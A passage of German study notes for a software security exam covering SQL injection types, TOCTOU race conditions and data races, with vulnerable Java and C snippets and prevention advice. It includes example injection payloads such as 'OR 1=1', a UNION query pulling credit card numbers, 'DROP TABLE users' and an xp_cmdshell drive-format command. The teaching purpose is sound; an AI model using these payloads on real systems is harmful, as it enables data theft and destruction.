<span class="hljs-number">8</span> <span class="hljs-keyword">if</span> ((! login.equals(<span class="hljs-string">""</span>)) &amp;&amp; (! pin.equals(<span class="hljs-string">""</span>))) {
<span class="hljs-number">9</span> queryString += <span class="hljs-string">"login='"</span> + login +
<span class="hljs-number">10</span> <span class="hljs-string">"' AND pin="</span> + pin;
<span class="hljs-number">11</span> } <span class="hljs-keyword">else</span> {
<span class="hljs-number">12</span> queryString += <span class="hljs-string">"login='guest' "</span>;
<span class="hljs-number">13</span> }
</code></pre><h4 id="Analyse-des-Codes"><a class="anchor hidden-xs" href="#Analyse-des-Codes" title="Analyse-des-Codes"><i class="fa fa-link"></i></a>Analyse des Codes:</h4><ol>
<li>
<p><strong>Zeile 7:</strong> Initialisierung der Variable <code>queryString</code>, die die Grundstruktur der SQL-Abfrage enthält.</p>
</li>
<li>
<p><strong>Zeilen 8-11:</strong> Bedingte Konkatenation von Abfragekriterien basierend auf den Benutzereingaben <code>login</code> und <code>pin</code>.</p>
<ul>
<li>Die Bedingung <code>(! login.equals("")) &amp;&amp; (! pin.equals(""))</code> prüft, ob sowohl <code>login</code> als auch <code>pin</code> nicht leer sind.</li>
<li>Wenn beide Bedingungen erfüllt sind (d.h., <code>login</code> und <code>pin</code> sind nicht leer), wird die Abfrage um die Bedingungen <code>login='...'</code> und <code>AND pin=...</code> erweitert.</li>
<li>Hierbei wird jedoch kein Schutz gegen SQL-Injection angewendet. Wenn die Werte von <code>login</code> und <code>pin</code> direkt aus Benutzereingaben stammen, könnten sie potenziell manipuliert werden, um die SQL-Abfrage zu verändern oder zusätzliche Aktionen durchzuführen.</li>
</ul>
</li>
<li>
<p><strong>Zeilen 12-13:</strong> Alternativfall, falls entweder <code>login</code> oder <code>pin</code> leer sind.</p>
<ul>
<li>Wenn entweder <code>login</code> oder <code>pin</code> leer ist, wird standardmäßig die Abfrage erzeugt: <code>queryString += "login='guest' ";</code></li>
<li>Dies könnte bedeuten, dass die Anwendung in diesem Fall auf eine Standardaktion für den Gastbenutzer zurückgreift.</li>
</ul>
</li>
</ol><h3 id="Potenzielle-Schwachstellen"><a class="anchor hidden-xs" href="#Potenzielle-Schwachstellen" title="Potenzielle-Schwachstellen"><i class="fa fa-link"></i></a>Potenzielle Schwachstellen:</h3><ul>
<li><strong>SQL-Injection:</strong> Die Konstruktion der SQL-Abfrage in den Zeilen 9 und 10 (<code>queryString += "login='" + login + "' AND pin=" + pin;</code>) ist anfällig für SQL-Injection. Wenn ein Angreifer die Eingabefelder <code>login</code> oder <code>pin</code> so manipulieren kann, dass sie SQL-Code einschleusen können (z.B. durch Einfügen von <code>'</code> oder anderen speziellen Zeichen), kann dies zu unerwünschten Ergebnissen führen.</li>
<li><strong>Mangelnde Validierung und Bereinigung:</strong> Der Code führt keine Validierung oder Bereinigung der Benutzereingaben <code>login</code> und <code>pin</code> durch, bevor sie in die SQL-Abfrage eingefügt werden. Dadurch wird die Anwendung anfällig für Manipulationen durch SQL-Injection-Angriffe.</li>
</ul><h3 id="Formen-des-injizierten-SQL-Codes"><a class="anchor hidden-xs" href="#Formen-des-injizierten-SQL-Codes" title="Formen-des-injizierten-SQL-Codes"><i class="fa fa-link"></i></a>Formen des injizierten SQL-Codes</h3><h4 id="1-Tautologien"><a class="anchor hidden-xs" href="#1-Tautologien" title="1-Tautologien"><i class="fa fa-link"></i></a>1. Tautologien</h4><ul>
<li><strong>Definition:</strong> Code wird in Bedingungsaussagen injiziert, sodass diese immer als wahr bewertet werden.</li>
<li><strong>Beispiel:</strong> <code>SELECT accounts FROM users WHERE login='' OR 1=1 -- AND pin=</code></li>
<li><strong>Schwierigkeit:</strong> Blacklisting von Tautologien ist schwierig, da es viele Möglichkeiten gibt, sie zu schreiben, z.B. <code>1&gt;0</code>, <code>'x' LIKE 'x'</code>. Auch möglich: Quasi-Tautologien: sehr oft wahr, z.B. <code>RAND() &gt; 0.01</code></li>
</ul><h4 id="2-Illegaleinkorrekte-Abfragen"><a class="anchor hidden-xs" href="#2-Illegaleinkorrekte-Abfragen" title="2-Illegaleinkorrekte-Abfragen"><i class="fa fa-link"></i></a>2. Illegale/inkorrekte Abfragen</h4><ul>
<li><strong>Definition:</strong> Löst einen Laufzeitfehler aus, um aus Fehlermeldungen Informationen zu gewinnen.</li>
<li><strong>Beispiel:</strong> <code>SELECT accounts FROM users WHERE login='' AND pin=convert(int, (select top 1 name from sysobjects where xtype='u'))</code></li>
<li><strong>Zweck:</strong> Fehlermeldungen können Informationen über das verwendete DBMS und Datenbankstrukturen preisgeben.</li>
</ul><h4 id="3-Union-Abfragen"><a class="anchor hidden-xs" href="#3-Union-Abfragen" title="3-Union-Abfragen"><i class="fa fa-link"></i></a>3. Union-Abfragen</h4><ul>
<li><strong>Definition:</strong> Eine zweite Abfrage mit UNION injizieren.</li>
<li><strong>Beispiel:</strong> <code>SELECT accounts FROM users WHERE login='' UNION SELECT cardNo FROM CreditCards WHERE acctNo=10032-- AND pin=))</code></li>
<li><strong>Zweck:</strong> Kann Daten aus einer anderen Tabelle offenlegen, z.B. Kreditkartennummern.</li>
</ul><h4 id="4-Piggy-backed-Queries"><a class="anchor hidden-xs" href="#4-Piggy-backed-Queries" title="4-Piggy-backed-Queries"><i class="fa fa-link"></i></a>4. Piggy-backed Queries</h4><ul>
<li><strong>Definition:</strong> Injektion einer zweiten, separaten Abfrage.</li>
<li><strong>Beispiel:</strong> <code>SELECT accounts FROM users WHERE login='doe'; DROP TABLE users--' AND pin=))</code></li>
<li><strong>Zweck:</strong> Die zweite Abfrage wird von der Datenbank ausgeführt, z.B. Löschen einer Tabelle.</li>
</ul><h4 id="5-Inferenzpaare"><a class="anchor hidden-xs" href="#5-Inferenzpaare" title="5-Inferenzpaare"><i class="fa fa-link"></i></a>5. Inferenzpaare</h4><ul>
<li><strong>Definition:</strong> Nutzung von Abfragepaaren, um durch Unterschiede in den Ausgaben Informationen zu extrahieren.</li>
<li><strong>Techniken:</strong>
<ul>
<li><strong>Blind Injection:</strong> Unterschiedliche Antworten auf immer wahre vs. immer falsche Bedingungen.</li>
<li><strong>Timing Attack:</strong> Unterschiede in der Antwortzeit basierend auf booleschen Werten.</li>
</ul>
</li>
<li><strong>Beispiel:</strong>
<ul>
<li>Schritt 1: <code>SELECT accounts FROM users WHERE login='legalUser' AND 1=1--'</code></li>
<li>Schritt 2: <code>SELECT accounts FROM users WHERE login='legalUser' AND 1=0--'</code></li>
</ul>
</li>
</ul><h4 id="6-Gespeicherte-Prozeduren-und-andere-DBMS-Funktionen"><a class="anchor hidden-xs" href="#6-Gespeicherte-Prozeduren-und-andere-DBMS-Funktionen" title="6-Gespeicherte-Prozeduren-und-andere-DBMS-Funktionen"><i class="fa fa-link"></i></a>6. Gespeicherte Prozeduren und andere DBMS-Funktionen</h4><ul>
<li><strong>Definition:</strong> Benutzerdefinierte Unterroutinen, die zusätzliche Operationen unterstützen und potenziell zusätzliche Schwachstellen öffnen.</li>
<li><strong>Beispiel:</strong>
<ul>
<li><code>CREATE PROCEDURE DBO.isAuthenticated userName varchar2, pin int AS EXEC("SELECT accounts FROM users WHERE login='" + userName + "' and pass='" + pass + "' and pin=" + pin); GO</code></li>
</ul>
</li>
<li><strong>Gefährlichste Prozedur:</strong> <code>xp_cmdshell</code> in Microsoft SQL Server, die Betriebssystembefehle ausführen kann.
<ul>
<li><strong>Beispiel:</strong> <code>EXEC master..xp_cmdshell 'format.c:'</code></li>
<li><strong>Hinweis:</strong> Standardmäßig deaktiviert, kann aber von Datenbankadministratoren aktiviert werden.</li>
</ul>
</li>
</ul><h4 id="Andere-Datenbankserver-Funktionen"><a class="anchor hidden-xs" href="#Andere-Datenbankserver-Funktionen" title="Andere-Datenbankserver-Funktionen"><i class="fa fa-link"></i></a>Andere Datenbankserver-Funktionen</h4><ul>
<li><strong>Beispiel:</strong> MySQL erlaubt das Schreiben von Dateien mit <code>SELECT INTO OUTFILE 'outfile.txt'</code>.</li>
<li><strong>Zweck:</strong> Angreifer können Dateien schreiben, um Daten zu exfiltrieren oder schädlichen Code auszuführen.</li>
</ul><h3 id="Prävention-und-Detektion-von-SQL-Injection-Schwachstellen"><a class="anchor hidden-xs" href="#Prävention-und-Detektion-von-SQL-Injection-Schwachstellen" title="Prävention-und-Detektion-von-SQL-Injection-Schwachstellen"><i class="fa fa-link"></i></a>Prävention und Detektion von SQL-Injection-Schwachstellen</h3><h4 id="Präventive-Maßnahmen"><a class="anchor hidden-xs" href="#Präventive-Maßnahmen" title="Präventive-Maßnahmen"><i class="fa fa-link"></i></a>Präventive Maßnahmen</h4><ol>
<li>
<p><strong>Filterung zur Eingabebereinigung</strong></p>
<ul>
<li><strong>Zweck:</strong> Entfernung potenziell gefährlicher Zeichen aus Eingaben, bevor sie in SQL-Abfragen verwendet werden.</li>
<li><strong>Herausforderung:</strong> Schwierig, alle potenziell gefährlichen Eingaben zu identifizieren.</li>
</ul>
</li>
<li>
<p><strong>Prepared Statements (Parametrisierte Abfragen)</strong></p>
<ul>
<li><strong>Definition:</strong> Vorab kompilierte SQL-Abfragen, bei denen Platzhalter für Eingabeparameter verwendet werden.</li>
<li><strong>Zweck:</strong> Verhindern direkter Eingabe von Daten in SQL-Abfragen und vermeiden damit potenzielle Injektionsangriffe.</li>
<li><strong>Vorteil:</strong> Effektiv gegen typische SQL-Injection-Angriffe.</li>
</ul>
</li>
<li>
<p><strong>Verwendung von Datenbanktreiber-Bibliotheken</strong></p>
<ul>
<li><strong>Zweck:</strong> Abstraktion von spezifischen DBMS-Funktionalitäten, um Sicherheitslücken zu minimieren und eine konsistente API für sichere Interaktionen bereitzustellen.</li>
</ul>
</li>
</ol><h4 id="Schwächen-von-Prepared-Statements"><a class="anchor hidden-xs" href="#Schwächen-von-Prepared-Statements" title="Schwächen-von-Prepared-Statements"><i class="fa fa-link"></i></a>Schwächen von Prepared Statements</h4><ul>
<li>
<p><strong>Logikfehler und Business Logic Exploits:</strong> Prepared Statements schützen primär vor Injektionen von SQL-Code. Angriffe, die auf Logikfehlern oder spezifischen Anwendungslogiken basieren, wie z.B. Zugriffssteuerungsprobleme oder unsichere Anwendungslogik, sind nicht durch Prepared Statements abgedeckt.</p>
</li>
<li>
<p><strong>Angriffe auf Autorisierung und Session Management:</strong> Diese Angriffe zielen darauf ab, Schwachstellen in der Implementierung der Benutzer-Authentifizierung und -Autorisierung auszunutzen, die außerhalb des Rahmens von SQL-Abfragen liegen.</p>
</li>
</ul><h4 id="Detektion-und-Reaktion-auf-SQL-Injection-Schwachstellen"><a class="anchor hidden-xs" href="#Detektion-und-Reaktion-auf-SQL-Injection-Schwachstellen" title="Detektion-und-Reaktion-auf-SQL-Injection-Schwachstellen"><i class="fa fa-link"></i></a>Detektion und Reaktion auf SQL-Injection-Schwachstellen</h4><ol>
<li>
<p><strong>Statische Prävention: Automatisierte Analyse</strong></p>
<ul>
<li><strong>Techniken:</strong>
<ul>
<li>Erkennen verdächtiger Code-Muster wie dynamische Abfragekonstruktionen.</li>
<li>Verwendung von statischer Taint-Analysis, um Datenflüsse von Eingabeparametern zu Abfragen zu verfolgen und potenzielle Schwachstellen zu identifizieren.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Unterschiede bei Metazeichen</strong></p>
<ul>
<li><strong>Idee:</strong> Verwendung von Vorverarbeitungs- und Laufzeitmonitoringtechniken, um Abfragen dynamisch zu überwachen und verdächtige Aktivitäten zu erkennen.</li>
<li><strong>Vorgehensweise:</strong> Erstellung eines Zustandsautomatenmodells der SQL-Grammatik zur Erkennung von Abfrageverletzungen während der Ausführung.</li>
</ul>
</li>
</ol><h3 id="Erkennung-von-SQL-Injections-in-der-Klausur"><a class="anchor hidden-xs" href="#Erkennung-von-SQL-Injections-in-der-Klausur" title="Erkennung-von-SQL-Injections-in-der-Klausur"><i class="fa fa-link"></i></a>Erkennung von SQL-Injections in der Klausur</h3><p>Um SQL-Injection (SQLi) in einem gegebenen Code während einer Klausur zu erkennen, achte auf folgende Punkte. Generell gilt, dass eine SQL Injection nur bei Verwendung von SQL und DB-Abfragen auftreten:</p><ol>
<li>
<p><strong>String-Konkatenation für SQL-Abfragen:</strong> Direkte Konkatenation von Benutzereingaben in SQL-Abfragen ist riskant und kann SQL-Injection ermöglichen.</p>
</li>
<li>
<p><strong>Fehlende Validierung von Benutzereingaben:</strong> Mangelnde Überprüfung oder unzureichende Validierung von Benutzereingaben vor deren Verwendung in SQL-Abfragen ist eine potenzielle Schwachstelle.</p>
</li>
<li>
<p><strong>Fehlen von Parameterisierung:</strong> Vermeidung von parameterisierten Abfragen (z. B. Prepared Statements), die sicherstellen, dass Benutzereingaben sicher in SQL-Abfragen verwendet werden.</p>
</li>
<li>
<p><strong>Direkte Datenbankinteraktion ohne ORM-Frameworks:</strong> Direkte Datenbankzugriffe ohne ORM-Frameworks oder sichere Datenbankzugriffsbibliotheken erhöhen das Risiko von SQL-Injection.</p>
</li>
</ol><h1 id="Race-Conditions-und-TOCTOU-Time-of-Check-to-Time-of-Use"><a class="anchor hidden-xs" href="#Race-Conditions-und-TOCTOU-Time-of-Check-to-Time-of-Use" title="Race-Conditions-und-TOCTOU-Time-of-Check-to-Time-of-Use"><i class="fa fa-link"></i></a>Race Conditions und TOCTOU (Time-of-Check to Time-of-Use)</h1><ul>
<li>
<p><strong>Definition</strong>: Race Conditions entstehen, wenn der Zustand einer Datei (z.B. Berechtigungen, Inhalt) zwischen dem Zeitpunkt der Überprüfung und dem Zeitpunkt der Nutzung geändert wird. Dieses Sicherheitsproblem wird als TOCTOU bezeichnet.</p>
</li>
<li>
<p><strong>Beispiel</strong>: Angenommen, ein Programm führt vor dem Lesen einer Datei eine Berechtigungsprüfung mit <code>access("/tmp/userfile", R_OK)</code> durch und öffnet dann die Datei mit <code>open("/tmp/userfile", O_RDONLY)</code>:</p>
<pre><code class="c hljs">res = access(<span class="hljs-string">"/tmp/userfile"</span>, R_OK);
if (res != 0)
    die(<span class="hljs-string">"access"</span>);
/* ok, we can read from /tmp/userfile */
fd = open(<span class="hljs-string">"/tmp/userfile"</span>, O_RDONLY);
</code></pre>
<p>Hier liegt eine TOCTOU-Schwachstelle vor, da zwischen dem Aufruf von <code>access</code> und <code>open</code> ein Angreifer die Datei <code>/tmp/userfile</code> manipulieren könnte.</p>
</li>
</ul><h3 id="Sicherheitsrisiken-und-Angriffsszenarien"><a class="anchor hidden-xs" href="#Sicherheitsrisiken-und-Angriffsszenarien" title="Sicherheitsrisiken-und-Angriffsszenarien"><i class="fa fa-link"></i></a>Sicherheitsrisiken und Angriffsszenarien</h3><ul>
<li>
<p><strong>Permission Races</strong>: Ein Angreifer könnte während des kurzen Zeitfensters zwischen <code>access</code> und <code>open</code> die Berechtigungen der Datei ändern. Dies könnte dazu führen, dass das Programm versehentlich eine Datei öffnet, auf die es eigentlich keinen Zugriff haben sollte.</p>
</li>
<li>
<p><strong>Ownership Races</strong>: Ähnlich wie bei Permission Races könnte ein Angreifer den Dateibesitzer zwischen <code>access</code> und <code>open</code> ändern, was das Programm dazu verleiten könnte, die Datei mit falschen Annahmen zu verwenden.</p>
</li>
<li>
<p><strong>Directory Races</strong>: Diese treten auf, wenn ein Angreifer Verzeichnisstrukturen ändert, auf die das Programm zugreift. Ein Beispiel wäre das Ersetzen eines Verzeichnisses durch eine Symlink-Datei auf eine sensible Datei wie <code>/etc/shadow</code>.</p>
</li>
</ul><h3 id="Ausnutzung-von-TOCTOU-Time-of-Check-to-Time-of-Use"><a class="anchor hidden-xs" href="#Ausnutzung-von-TOCTOU-Time-of-Check-to-Time-of-Use" title="Ausnutzung-von-TOCTOU-Time-of-Check-to-Time-of-Use"><i class="fa fa-link"></i></a>Ausnutzung von TOCTOU (Time-of-Check to Time-of-Use)</h3><ol>
<li>
<p><strong>Timing-Abhängigkeit</strong>: Da Unix mehrere Prozesse gleichzeitig ausführt, könnte ein Angreifer einen schädlichen Prozess gleichzeitig mit einem Setuid-Programm starten. Der Angriff muss präzise zum richtigen Zeitpunkt erfolgen, um die Sicherheitslücke auszunutzen.</p>
</li>
<li>
<p><strong>Betriebssystem-Planung</strong>: Prozesse werden vom Betriebssystem geplant und können auf mehreren CPUs ausgeführt werden. Dies bietet dem Angreifer die Möglichkeit, die Timing- und Ausführungsbedingungen zu analysieren, um gezielt eine Race Condition auszunutzen.</p>
</li>
<li>
<p><strong>Beeinflussung der Systemplanung</strong>: Ein Angreifer könnte versuchen, die Systemplanung zu beeinflussen, indem er das System verlangsamt oder gezielt Steuerungssignale sendet. Dadurch könnte er die Wahrscheinlichkeit erhöhen, dass sein schädlicher Prozess zur richtigen Zeit ausgeführt wird, um die Sicherheitslücke auszunutzen.</p>
</li>
<li>
<p><strong>Automatisierung des Angriffs</strong>: Durch die Nutzung von Mechanismen wie der Linux inotify API zur Überwachung des Dateisystems könnte ein Angreifer den Angriff automatisieren. Dies ermöglicht es ihm, auf Änderungen im Dateisystem zu reagieren und den schädlichen Prozess zur richtigen Zeit zu starten, um von der Race Condition zu profitieren.</p>
</li>
</ol><h3 id="Race-Conditions-im-Kontext-von-Code"><a class="anchor hidden-xs" href="#Race-Conditions-im-Kontext-von-Code" title="Race-Conditions-im-Kontext-von-Code"><i class="fa fa-link"></i></a>Race Conditions im Kontext von Code</h3><h4 id="Permission-Races"><a class="anchor hidden-xs" href="#Permission-Races" title="Permission-Races"><i class="fa fa-link"></i></a>Permission Races</h4><pre><code class="c hljs">FILE *<span class="hljs-built_in">fp</span><span class="hljs-comment">;</span>
int fd<span class="hljs-comment">;</span>

if (!(<span class="hljs-built_in">fp</span> = fopen(myfile, <span class="hljs-string">"w+"</span>)))
    <span class="hljs-keyword">die("fopen");
</span>
<span class="hljs-comment">/* Hier könnte ein Angreifer die Berechtigungen der Datei ändern */</span>

fd = fileno(<span class="hljs-built_in">fp</span>)<span class="hljs-comment">;</span>

<span class="hljs-comment">/* Jetzt ändern wir die Berechtigungen der Datei */</span>
if (fchmod(fd, <span class="hljs-number">0600</span>) == -<span class="hljs-number">1</span>)
    <span class="hljs-keyword">die("fchmod");
</span></code></pre><p><strong>Beschreibung</strong>: Nachdem <code>fopen</code> die Datei geöffnet hat, aber bevor <code>fchmod</code> die Berechtigungen ändert, besteht ein kurzes Zeitfenster. Ein Angreifer könnte in diesem Fenster die Berechtigungen der Datei ändern. Wenn das Programm dann <code>fchmod</code> aufruft, um die Berechtigungen auf 0600 (nur der Besitzer kann lesen und schreiben) zu ändern, könnte es unwissentlich die geänderten Berechtigungen übernehmen, was zu unerwartetem Verhalten führt.</p><h4 id="Ownership-Races"><a class="anchor hidden-xs" href="#Ownership-Races" title="Ownership-Races"><i class="fa fa-link"></i></a>Ownership Races</h4><pre><code class="c hljs"><span class="hljs-selector-tag">drop_privs</span>();

<span class="hljs-comment">/* Hier öffnen wir die Datei mit speziellen Berechtigungen */</span>
<span class="hljs-selector-tag">if</span> ((fd = open(myfile, O_RDWR | O_CREAT | O_EXCL, <span class="hljs-number">0600</span>)) &lt; <span class="hljs-number">0</span>)
    <span class="hljs-selector-tag">die</span>(<span class="hljs-string">"open"</span>);

<span class="hljs-selector-tag">regain_privs</span>();

<span class="hljs-comment">/* Jetzt übernehmen wir den Besitz der Datei */</span>
<span class="hljs-selector-tag">if</span> (fchown(fd, geteuid(), getegid()) == -<span class="hljs-number">1</span>)
    <span class="hljs-selector-tag">die</span>(<span class="hljs-string">"fchown"</span>);
</code></pre><p><strong>Beschreibung</strong>: Ähnlich wie bei Permission Races könnte ein Angreifer während des kurzen Zeitfensters zwischen <code>open</code> und <code>fchown</code> den Besitzer der Datei ändern. Das Programm könnte dann fälschlicherweise den neuen Besitzer übernehmen und damit arbeiten, was zu Sicherheitsproblemen führen kann, insbesondere in sicherheitskritischen Umgebungen.</p><h4 id="Directory-Position-Races"><a class="anchor hidden-xs" href="#Directory-Position-Races" title="Directory-Position-Races"><i class="fa fa-link"></i></a>Directory Position Races</h4><pre><code class="c hljs"><span class="hljs-comment">/* Beispiel für Rennbedingungen beim Löschen eines Verzeichnisbaums */</span>
<span class="hljs-selector-tag">chdir</span>(<span class="hljs-string">"/tmp/a"</span>);
<span class="hljs-selector-tag">chdir</span>(<span class="hljs-string">"b"</span>);
<span class="hljs-selector-tag">chdir</span>(<span class="hljs-string">"c"</span>);
<span class="hljs-selector-tag">chdir</span>(<span class="hljs-string">".."</span>);
<span class="hljs-selector-tag">rmdir</span>(<span class="hljs-string">"c"</span>);
<span class="hljs-selector-tag">chdir</span>(<span class="hljs-string">".."</span>);
<span class="hljs-selector-tag">rmdir</span>(<span class="hljs-string">"b"</span>);
<span class="hljs-selector-tag">fchdir</span>(<span class="hljs-number">3</span>);
<span class="hljs-selector-tag">rmdir</span>(<span class="hljs-string">"/tmp/a"</span>);
</code></pre><p><strong>Beschreibung</strong>: Dieses Beispiel zeigt, wie durch geschicktes Verändern der Verzeichnisstruktur zwischen den Aufrufen von <code>chdir</code> und <code>rmdir</code> ein Angreifer den Programmfluss manipulieren könnte. Zum Beispiel könnte er das Verzeichnis <code>c</code> nach <code>/tmp/c</code> verschieben und dann durch die Rückkehr zu <code>chdir("..")</code> das Programm dazu bringen, das falsche Verzeichnis zu löschen.</p><h4 id="Sicherheitslücken-bei-der-Verwendung-temporärer-Dateien"><a class="anchor hidden-xs" href="#Sicherheitslücken-bei-der-Verwendung-temporärer-Dateien" title="Sicherheitslücken-bei-der-Verwendung-temporärer-Dateien"><i class="fa fa-link"></i></a>Sicherheitslücken bei der Verwendung temporärer Dateien</h4><pre><code class="c hljs"><span class="hljs-regexp">/* Verwendung von mktemp zum Erstellen einer temporären Datei */</span>
 char temp[<span class="hljs-number">1024</span>];
 intfd;
 strcpy(temp, <span class="hljs-string">"/tmp/tmpXXXX"</span>);
 <span class="hljs-keyword">if</span>(!mktemp(temp))
 die(<span class="hljs-string">"mktemp"</span>);
 fd=open(temp, O_CREAT | O_RDWR, <span class="hljs-number">0700</span>);
 <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">0</span>)
 {
 perror(<span class="hljs-string">"open"</span>);
 <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
 }

</code></pre><p><strong>Potenzielle Sicherheitslücken:</strong><br>
Vorhersehbarer Dateiname: Der Dateiname “/tmp/tmpXXXX” wird verwendet, wobei XXXX durch zufällige Zeichen ersetzt wird. Jedoch ist die Länge des vorherigen Dateinamens bekannt, was theoretisch einen Angriff ermöglicht, bei dem ein Angreifer versucht, eine Datei mit dem gleichen vorhersehbaren Muster zu erstellen, bevor das Programm sie öffnet.</p><ul>
<li>Race Condition: Zwischen dem Aufruf von mktemp und dem Öffnen der Datei open besteht ein kleines Zeitfenster. Während dieses Zeitfensters könnte ein Angreifer versuchen, eine Datei mit dem gleichen Namen zu erstellen, was dazu führen könnte, dass das Programm die von ihm erstellte Datei anstelle der beabsichtigten temporären Datei verwendet.</li>
</ul><h3 id="Lösungen-und-Prävention"><a class="anchor hidden-xs" href="#Lösungen-und-Prävention" title="Lösungen-und-Prävention"><i class="fa fa-link"></i></a>Lösungen und Prävention</h3><ul>
<li>
<p><strong>Verwendung von Dateideskriptoren</strong>: Anstatt mehrfach den Dateinamen aufzulösen, was zu Race Conditions führen kann, sollten Programme Dateideskriptoren verwenden. Dateideskriptoren (File Descriptors) enthalten den aufgelösten Inode der Datei, was sicherstellt, dass die Datei während der Operation stabil bleibt.</p>
</li>
<li>
<p><strong>Atomare Operationen</strong>: Betriebssysteme bieten oft atomare Operationen wie <code>openat</code> in Verbindung mit <code>O_NOFOLLOW</code>, um atomare Operationen (z.B. Vermeidung von Symlink-Angriffen) sicher auszuführen.</p>
</li>
<li>
<p><strong>Sichere Programmierpraktiken</strong>: Entwickler sollten sich bewusst sein, dass diese Race Conditions existieren und sicherstellen, dass kritische Operationen in einer sicheren und atomaren Art und Weise ausgeführt werden, besonders in sicherheitskritischen Anwendungen.</p>
</li>
</ul><h3 id="Beispiele-für-Angriffsszenarien"><a class="anchor hidden-xs" href="#Beispiele-für-Angriffsszenarien" title="Beispiele-für-Angriffsszenarien"><i class="fa fa-link"></i></a>Beispiele für Angriffsszenarien</h3><ul>
<li>
<p><strong>Symlink-Attacke</strong>: Ein Angreifer könnte eine Datei wie <code>/tmp/userfile</code> erstellen und dann schnell in eine Symlink-Datei auf eine sensible Datei wie <code>/etc/shadow</code> ändern, bevor das Programm <code>open</code> ausführt. Dadurch würde das Programm <code>open</code> auf die falsche Datei zugreifen.</p>
</li>
<li>
<p><strong>Dateiinhalt-Manipulation</strong>: Ein Angreifer könnte während des kurzen Intervalls zwischen <code>access</code> und <code>open</code> den Inhalt der Datei ändern, auf die das Programm zugreift. Dies könnte zu falschen Annahmen und potenziellen Sicherheitsverletzungen führen.</p>
</li>
</ul><h2 id="Race-Conditions-mit-Time-of-Check-to-Time-of-Use-TOCTOU-in-Klausur-erkennen"><a class="anchor hidden-xs" href="#Race-Conditions-mit-Time-of-Check-to-Time-of-Use-TOCTOU-in-Klausur-erkennen" title="Race-Conditions-mit-Time-of-Check-to-Time-of-Use-TOCTOU-in-Klausur-erkennen"><i class="fa fa-link"></i></a>Race Conditions mit Time-of-Check to Time-of-Use (TOCTOU) in Klausur erkennen</h2><h3 id="Permission-Races1"><a class="anchor hidden-xs" href="#Permission-Races1" title="Permission-Races1"><i class="fa fa-link"></i></a>Permission Races</h3><ol>
<li>
<p><strong>Sequenz von Operationen</strong>: Suche nach einer Sequenz, in der das Programm zunächst die Berechtigungen einer Datei prüft (z.B. mit <code>access</code>) und dann die Datei basierend auf dieser Berechtigung öffnet oder manipuliert (z.B. mit <code>open</code>).</p>
</li>
<li>
<p><strong>Nicht-atomare Operationen</strong>: Stelle sicher, dass zwischen der Berechtigungsprüfung und der Dateioperation keine Operationen ausgeführt werden, die die Berechtigungen der Datei ändern könnten. Ein Angreifer könnte während dieses Zeitfensters die Berechtigungen der Datei ändern, was dazu führen könnte, dass das Programm eine Datei öffnet oder manipuliert, auf die es eigentlich keinen Zugriff haben sollte.</p>
</li>
</ol><h3 id="Ownership-Races1"><a class="anchor hidden-xs" href="#Ownership-Races1" title="Ownership-Races1"><i class="fa fa-link"></i></a>Ownership Races</h3><ol>
<li>
<p><strong>Sequenz von Operationen</strong>: Identifiziere Abschnitte im Code, in denen das Programm den Besitzer einer Datei prüft (z.B. mit <code>stat</code> oder ähnlichen Funktionen) und dann basierend auf dieser Prüfung Operationen ausführt, die den Dateibesitzer ändern (z.B. mit <code>chown</code>).</p>
</li>
<li>
<p><strong>Möglichkeit der Manipulation</strong>: Achte darauf, dass zwischen der Überprüfung des Dateibesitzers und der tatsächlichen Änderung des Besitzes keine Zeit vergeht, in der ein Angreifer den Besitzer der Datei ändern könnte. Ein solcher Angriff könnte das Programm dazu verleiten, mit falschen Annahmen über den Dateibesitzer zu arbeiten.</p>
</li>
</ol><h3 id="Directory-Races"><a class="anchor hidden-xs" href="#Directory-Races" title="Directory-Races"><i class="fa fa-link"></i></a>Directory Races</h3><ol>
<li>
<p><strong>Operationen auf Verzeichnisebene</strong>: Überprüfe Codeabschnitte, in denen das Programm mit Verzeichnisstrukturen interagiert, insbesondere beim Navigieren zwischen Verzeichnissen oder beim Erstellen, Löschen oder Umbenennen von Verzeichnissen.</p>
</li>
<li>
<p><strong>Sicherheitsrelevante Operationen</strong>: Beachte, ob das Programm potenziell sensitive Verzeichnisse oder Dateien manipuliert. Ein Angreifer könnte versuchen, die Verzeichnisstruktur so zu manipulieren, dass das Programm auf eine falsche Datei oder Verzeichnis zugreift, z.B. durch Ersetzen eines Verzeichnisses durch einen Symlink auf eine sensible Datei wie <code>/etc/shadow</code>.</p>
</li>
</ol><h1 id="Data-Races"><a class="anchor hidden-xs" href="#Data-Races" title="Data-Races"><i class="fa fa-link"></i></a>Data Races</h1><h3 id="Problemstellung-Race-Conditions-in-Multi-Threaded-Umgebungen"><a class="anchor hidden-xs" href="#Problemstellung-Race-Conditions-in-Multi-Threaded-Umgebungen" title="Problemstellung-Race-Conditions-in-Multi-Threaded-Umgebungen"><i class="fa fa-link"></i></a>Problemstellung: Race Conditions in Multi-Threaded-Umgebungen</h3><h4 id="Beispiel-BankAccount-Klasse-ohne-Synchronisierung"><a class="anchor hidden-xs" href="#Beispiel-BankAccount-Klasse-ohne-Synchronisierung" title="Beispiel-BankAccount-Klasse-ohne-Synchronisierung"><i class="fa fa-link"></i></a>Beispiel: BankAccount-Klasse ohne Synchronisierung</h4><pre><code class="java hljs"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BankAccount</span> </span>{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> balance;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">BankAccount</span><span class="hljs-params">(<span class="hljs-keyword">int</span> initialBalance)</span> </span>{
        <span class="hljs-keyword">if</span> (initialBalance &lt; <span class="hljs-number">0</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">"Initial balance must be &gt;= 0"</span>);
        <span class="hljs-keyword">this</span>.balance = initialBalance;
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">adjustBalance</span><span class="hljs-params">(<span class="hljs-keyword">int</span> adjustment)</span> </span>{
        balance = balance + adjustment;
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getBalance</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">return</span> balance;
    }
}
